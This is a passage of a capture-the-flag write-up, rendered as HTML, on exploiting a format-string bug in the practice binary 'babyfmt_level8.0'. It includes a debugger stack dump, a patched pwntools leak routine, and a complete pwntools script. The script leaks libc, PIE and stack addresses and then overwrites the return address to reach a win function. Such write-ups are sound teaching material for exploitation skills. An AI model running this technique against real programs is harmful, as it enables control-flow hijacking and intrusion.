+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="nt">15</span><span class="p">:</span><span class="nd">00a8</span><span class="err">│</span><span class="o">+</span><span class="nt">028</span><span class="w"> </span><span class="nt">0x7ffc5889a0b8</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0x1ed271970</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="nt">16</span><span class="p">:</span><span class="nd">00b0</span><span class="err">│</span><span class="o">+</span><span class="nt">030</span><span class="w"> </span><span class="nt">0x7ffc5889a0c0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="nt">17</span><span class="p">:</span><span class="nd">00b8</span><span class="err">│</span><span class="o">+</span><span class="nt">038</span><span class="w"> </span><span class="nt">0x7ffc5889a0c8</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0x2710ed271220</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="nt">18</span><span class="p">:</span><span class="nd">00c0</span><span class="err">│</span><span class="o">+</span><span class="nt">040</span><span class="w"> </span><span class="nt">0x7ffc5889a0d0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a1e0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="nt">19</span><span class="p">:</span><span class="nd">00c8</span><span class="err">│</span><span class="o">+</span><span class="nt">048</span><span class="w"> </span><span class="nt">0x7ffc5889a0d8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a270</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="nt">1a</span><span class="p">:</span><span class="nd">00d0</span><span class="err">│</span><span class="o">+</span><span class="nt">050</span><span class="w"> </span><span class="nt">0x7ffc5889a0e0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="nt">1b</span><span class="p">:</span><span class="nd">00d8</span><span class="err">│</span><span class="o">+</span><span class="nt">058</span><span class="w"> </span><span class="nt">0x7ffc5889a0e8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7f2dc325d083</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_start_main</span><span class="o">+</span><span class="nt">243</span><span class="o">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">mov</span><span class="w"> </span><span class="nt">edi</span><span class="o">,</span><span class="w"> </span><span class="nt">eax</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="nt">1c</span><span class="p">:</span><span class="nd">00e0</span><span class="err">│</span><span class="o">+</span><span class="nt">060</span><span class="w"> </span><span class="nt">0x7ffc5889a0f0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7f2dc3462620</span><span class="w"> </span><span class="o">(</span><span class="nt">_rtld_global_ro</span><span class="o">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0x6100100000000</span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="nt">1d</span><span class="p">:</span><span class="nd">00e8</span><span class="err">│</span><span class="o">+</span><span class="nt">068</span><span class="w"> </span><span class="nt">0x7ffc5889a0f8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a1d8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889b6ee</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="nt">1e</span><span class="p">:</span><span class="nd">00f0</span><span class="err">│</span><span class="o">+</span><span class="nt">070</span><span class="w"> </span><span class="nt">0x7ffc5889a100</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0x100000000</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="nt">1f</span><span class="p">:</span><span class="nd">00f8</span><span class="err">│</span><span class="o">+</span><span class="nt">078</span><span class="w"> </span><span class="nt">0x7ffc5889a108</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x55e0ed2717c4</span><span class="w"> </span><span class="o">(</span><span class="nt">main</span><span class="o">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">endbr64</span><span class="w"> </span>
+</code></pre></div>
+<h3 id="find-offset-and-padlen">find offset and padlen</h3>
+<p>So far so good, now before choosing the target address, find out the <strong>user_buffer</strong> start offset and needed <strong>padlen</strong> values.</p>
+<p>Again i edited search string <strong>FmtStr.leak_stack</strong> method in <code>/usr/local/lib/python3.12/dist-packages/pwnlib/fmtstr.py</code> .</p>
+<p>The method after edited looks like this. The only difference <strong>END</strong> to <strong>ENT</strong>. This is necessary because <strong>END</strong> string is affect behaviour of binary working routine.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">leak_stack</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;START</span><span class="si">%%%d</span><span class="s2">$pENT&quot;</span> <span class="o">%</span> <span class="n">offset</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>        <span class="n">leak</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">execute_fmt</span><span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>        <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>            <span class="n">leak</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">br</span><span class="s2">&quot;START(.*?)ENT&quot;</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>            <span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>            <span class="n">leak</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>        <span class="k">return</span> <span class="n">leak</span>
+</code></pre></div>
+<p>The needed values found as below.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="o">[*]</span><span class="w"> </span><span class="nt">Stopped</span><span class="w"> </span><span class="nt">process</span><span class="w"> </span><span class="s1">&#39;/host/babyfmt_level8.0&#39;</span><span class="w"> </span><span class="o">(</span><span class="nt">pid</span><span class="w"> </span><span class="nt">216</span><span class="o">)</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="o">[*]</span><span class="w"> </span><span class="nt">Found</span><span class="w"> </span><span class="nt">format</span><span class="w"> </span><span class="nt">string</span><span class="w"> </span><span class="nt">offset</span><span class="o">:</span><span class="w"> </span><span class="nt">30</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">User</span><span class="w"> </span><span class="nt">input</span><span class="w"> </span><span class="nt">starts</span><span class="w"> </span><span class="nt">at</span><span class="w">  </span><span class="o">:</span><span class="w"> </span><span class="nt">30</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">Needed</span><span class="w"> </span><span class="nt">pads</span><span class="w">           </span><span class="p">:</span><span class="nd">7</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="o">[+]</span><span class="w"> </span><span class="nt">Numbwritten</span><span class="w">           </span><span class="p">:</span><span class="nd">0</span>
+</code></pre></div>
+<h3 id="find-the-suitable-target-for-code-redirection">Find the suitable target for code redirection</h3>
+<p>^numbwritten-calculation</p>
+<p>The first thing in my mind is the overwrite return address. Why not ? 
+Now the first thing finding how many bytes written in so far. To find out easy way set <strong>numbwritten=0x0</strong> and overwrite return with 0x10.</p>
+<p>Set breakpoint end of <strong>func</strong> function and what value overwritten there find out.
+As you can see when try to write return address with <strong>0x10</strong> it turns out 0x69. That means written bytes <strong>0x59</strong>.</p>
+<p><img alt="" src="../images/640016167995a45732d694fe61a98ac8.png" /></p>
+<h3 id="get_flagpy">get_flag.py</h3>
+<p>After settling <strong>numbwritten=0x59</strong> and write return address with <strong>win</strong> function.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># -*- coding: utf-8 -*-</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># This exploit template was generated via:</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># $ pwn template &#39;--libc=./libc.so.6&#39; ./babyfmt_level8.0</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># Set up pwntools for the correct architecture</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">EXE</span> <span class="ow">or</span> <span class="s1">&#39;./babyfmt_level8.0&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># Many built-in settings can be controlled on the command-line and show up</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="c1"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="c1"># for all created processes...</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># ./exploit.py DEBUG NOASLR</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="c1"># Use the specified remote libc version unless explicitly told to use the</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="c1"># local system version with the `LOCAL_LIBC` argument.</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="c1"># ./exploit.py LOCAL LOCAL_LIBC</span>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL_LIBC</span><span class="p">:</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>    <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>    <span class="n">library_path</span> <span class="o">=</span> <span class="n">libcdb</span><span class="o">.</span><span class="n">download_libraries</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>    <span class="k">if</span> <span class="n">library_path</span><span class="p">:</span>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>        <span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">patch_custom_libraries</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">library_path</span><span class="p">)</span>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="w">    </span><span class="sd">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="c1"># Specify your GDB script here for debugging</span>
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a><span class="c1"># GDB will be launched if the exploit is run via e.g.</span>
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a><span class="c1"># ./exploit.py GDB</span>
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a><span class="s1">#brva 0x17a0</span>
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a><span class="s1">brva 0x17c3</span>
+<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a><span class="s1">continue</span>
+<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>
+<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a><span class="c1">#===========================================================</span>
+<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a><span class="c1">#                    EXPLOIT GOES HERE</span>
+<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a><span class="c1">#===========================================================</span>
+<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a><span class="c1"># Arch:     amd64-64-little</span>
+<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a><span class="c1"># RELRO:      Full RELRO</span>
+<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a><span class="c1"># Stack:      Canary found</span>
+<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a><span class="c1"># NX:         NX enabled</span>
+<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a><span class="c1"># PIE:        PIE enabled</span>
+<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a><span class="c1"># SHSTK:      Enabled</span>
+<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a><span class="c1"># IBT:        Enabled</span>
+<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a><span class="c1"># Stripped:   No</span>
+<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>
+<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a>    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;vulnerability:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a>
+<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a>
+<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a>
+<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a><span class="c1">#################################################</span>
+<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a><span class="c1">#### LEAK ADDRESSES AND CALCULATING OFFSETS #####</span>
+<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a><span class="c1">#################################################</span>
+<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a>
+<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a><span class="n">send_fmt</span><span class="p">(</span><span class="s1">&#39;%3$p|%151$p|%150$p&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a>
+<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your input is:&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a><span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a>
+<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a><span class="n">info</span><span class="p">(</span><span class="n">leaks</span><span class="p">)</span>
+<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a><span class="n">rbp_addr</span>    <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x50</span>
+<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a><span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x195a</span>
+<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x10e297</span>
+<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a>
+<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;RBP  Address   : </span><span class="si">{</span><span class="n">rbp_addr</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;EXE  BASE Addr : </span><span class="si">{</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;LIBC BASE Addr : </span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;WIN Address    : </span><span class="si">{</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">win</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-81" name="__codelineno-6-81" href="#__codelineno-6-81"></a>
+<a id="__codelineno-6-82" name="__codelineno-6-82" href="#__codelineno-6-82"></a><span class="c1">#### write part ####</span>
+<a id="__codelineno-6-83" name="__codelineno-6-83" href="#__codelineno-6-83"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">30</span>
+<a id="__codelineno-6-84" name="__codelineno-6-84" href="#__codelineno-6-84"></a><span class="n">padlen</span> <span class="o">=</span> <span class="mi">7</span>
+<a id="__codelineno-6-85" name="__codelineno-6-85" href="#__codelineno-6-85"></a>
+<a id="__codelineno-6-86" name="__codelineno-6-86" href="#__codelineno-6-86"></a><span class="n">f</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">send_fmt</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="n">padlen</span><span class="o">=</span><span class="mi">7</span><span class="p">,</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mh">0x59</span><span class="p">)</span>
+<a id="__codelineno-6-87" name="__codelineno-6-87" href="#__codelineno-6-87"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rbp_addr</span><span class="o">+</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">win</span><span class="p">)</span>
+<a id="__codelineno-6-88" name="__codelineno-6-88" href="#__codelineno-6-88"></a><span class="n">f</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
+<a id="__codelineno-6-89" name="__codelineno-6-89" href="#__codelineno-6-89"></a>
+<a id="__codelineno-6-90" name="__codelineno-6-90" href="#__codelineno-6-90"></a><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;vulnerability:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;END&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-91" name="__codelineno-6-91" href="#__codelineno-6-91"></a>
+<a id="__codelineno-6-92" name="__codelineno-6-92" href="#__codelineno-6-92"></a><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><strong>The result:</strong></p>
+<p><img alt="" src="../images/58ed5b7f22e6436a69c0ab633678a4f4.png" /></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>I think this is perfect binary for practicing other potential targets. As a reminder i dropped 2 link great value to me.</p>
+<p><a href="https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html">https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html</a>
+<a href="https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html">https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html</a></p>
+<h2 id="references">References</h2>
+<p><a href="https://sourceware.org/glibc/wiki/PointerEncryption">https://sourceware.org/glibc/wiki/PointerEncryption</a></p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="August 24, 2025 00:40:36 UTC">August 24, 2025</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
